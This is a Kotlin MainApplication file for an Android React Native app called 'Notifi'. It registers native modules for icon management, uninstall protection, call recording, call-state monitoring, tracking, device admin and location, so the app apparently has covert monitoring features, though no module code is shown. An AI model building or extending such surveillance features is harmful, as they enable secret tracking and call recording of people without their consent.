package com.cogniant.Notifi

import android.app.Application
import android.content.ComponentName
import android.content.Context
import android.content.res.Configuration
import android.app.admin.DevicePolicyManager // Added import
import com.facebook.react.PackageList
import com.facebook.react.ReactApplication
import com.facebook.react.ReactNativeHost
import com.facebook.react.ReactPackage
import com.facebook.react.ReactHost
import com.facebook.react.defaults.DefaultNewArchitectureEntryPoint.load
import com.facebook.react.defaults.DefaultReactNativeHost
import com.facebook.react.soloader.OpenSourceMergedSoMapping
import com.facebook.soloader.SoLoader
import com.cogniant.Notifi.IconManagerPackage
import com.cogniant.Notifi.UninstallProtectionPackage
import expo.modules.ApplicationLifecycleDispatcher
import expo.modules.ReactNativeHostWrapper
import com.cogniant.Notifi.LocationServicePackage
import com.cogniant.Notifi.DeviceAdminPackage
import android.util.Log

class MainApplication : Application(), ReactApplication {

  override val reactNativeHost: ReactNativeHost = ReactNativeHostWrapper(
    this,
    object : DefaultReactNativeHost(this) {
      override fun getPackages(): List<ReactPackage> {
        val packages = PackageList(this).packages
        // Add custom packages manually
        packages.add(IconManagerPackage())
        packages.add(UninstallProtectionPackage())
        packages.add(CallRecorderPackage())
        packages.add(CallStatePackage())
        packages.add(TrackingPackage()) // Removed duplicate
        packages.add(DeviceAdminPackage())
        packages.add(LocationServicePackage())
        return packages
      }

      override fun getJSMainModuleName(): String = ".expo/.virtual-metro-entry"

      override fun getUseDeveloperSupport(): Boolean = BuildConfig.DEBUG

      override val isNewArchEnabled: Boolean = BuildConfig.IS_NEW_ARCHITECTURE_ENABLED
      override val isHermesEnabled: Boolean = BuildConfig.IS_HERMES_ENABLED
    }
  )

  override val reactHost: ReactHost
    get() = ReactNativeHostWrapper.createReactHost(applicationContext, reactNativeHost)

  override fun onCreate() {
    super.onCreate()
    SoLoader.init(this, OpenSourceMergedSoMapping)
    if (BuildConfig.IS_NEW_ARCHITECTURE_ENABLED) {
      load()
    }
    ApplicationLifecycleDispatcher.onApplicationCreate(this)

    // Debug Device Admin status on app start
    val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
    val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
    Log.d("MainApplication", "Device Admin active: ${devicePolicyManager.isAdminActive(adminComponent)}")
  }

  override fun onConfigurationChanged(newConfig: Configuration) {
    super.onConfigurationChanged(newConfig)
    ApplicationLifecycleDispatcher.onConfigurationChanged(this, newConfig)
  }
}